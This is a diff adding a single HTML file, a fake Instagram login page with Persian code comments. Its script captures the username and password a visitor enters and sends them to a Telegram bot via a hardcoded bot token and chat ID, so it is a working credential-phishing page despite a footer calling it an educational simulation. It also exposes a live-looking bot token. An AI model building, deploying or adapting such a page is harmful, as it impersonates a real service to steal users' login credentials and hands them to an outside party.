@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        /* بدنه */
+        body {
+            margin: 0;
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #fdfbfb, #ebedee);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        /* انیمیشن پس‌زمینه */
+        .background-animation {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            background: radial-gradient(circle, rgba(255, 255, 255, 0.1), transparent);
+            animation: move 15s linear infinite;
+        }
+
+        @keyframes move {
+            0% {
+                transform: translateX(0) translateY(0);
+            }
+            50% {
+                transform: translateX(-50px) translateY(-50px);
+            }
+            100% {
+                transform: translateX(0) translateY(0);
+            }
+        }
+
+        /* کادر لاگین */
+        .login-container {
+            background-color: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 350px;
+            position: relative;
+        }
+
+        /* لوگو */
+        .login-container img {
+            width: 150px;
+            margin-bottom: 20px;
+        }
+
+        /* ورودی‌ها */
+        .login-container input[type="text"],
+        .login-container input[type="password"] {
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 5px;
+            font-size: 14px;
+            background: #fafafa;
+        }
+
+        /* دکمه ورود */
+        .login-container input[type="submit"] {
+            width: 100%;
+            padding: 15px;
+            background: #0095f6;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            font-weight: bold;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: background 0.3s ease;
+        }
+
+        .login-container input[type="submit"]:hover {
+            background: #0073e6;
+        }
+
+        /* لینک ثبت‌نام */
+        .signup {
+            margin-top: 20px;
+            color: #8e8e8e;
+            font-size: 14px;
+        }
+
+        .signup a {
+            text-decoration: none;
+            color: #0095f6;
+            font-weight: bold;
+        }
+
+        .signup a:hover {
+            text-decoration: underline;
+        }
+
+        /* پیام تست */
+        .footer {
+            margin-top: 20px;
+            color: #8e8e8e;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+    <!-- پس‌زمینه انیمیشن -->
+    <div class="background-animation"></div>
+
+    <!-- کادر لاگین -->
+    <div class="login-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_logo_2022.svg/2048px-Instagram_logo_2022.svg.png" alt="Instagram Logo">
+        <form id="loginForm">
+            <input type="text" id="username" name="username" placeholder="Phone number, username, or email" required>
+            <input type="password" id="password" name="password" placeholder="Password" required>
+            <input type="submit" value="Log In">
+        </form>
+        <div class="signup">
+            Don't have an account? <a href="https://instagram.com">Sign up</a>
+        </div>
+        <div class="footer">This is a simulation for educational purposes only.</div>
+    </div>
+
+    <script>
+        // تنظیمات تلگرام
+        const botToken = "7522061393:AAF5wkCXqpb3Bh54H-pAqKIpRH9fd6Vv6m4";  // توکن ربات
+        const chatId = "7905022538";  // شناسه چت تلگرام
+        const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+        // ارسال اطلاعات فرم
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // جلوگیری از ارسال پیش‌فرض فرم
+
+            // دریافت داده‌ها
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            // پیام ارسالی به تلگرام
+            const message = `Instagram Login Attempt:\nUsername: ${username}\nPassword: ${password}`;
+
+            // ارسال داده به تلگرام
+            fetch(apiUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert("Information sent to Telegram.");
+                } else {
+                    alert("Failed to send data to Telegram.");
+                }
+            })
+            .catch(error => {
+                console.error("Error:", error);
+                alert("Error sending data.");
+            });
+        });
+    </script>
+</body>
+</html>
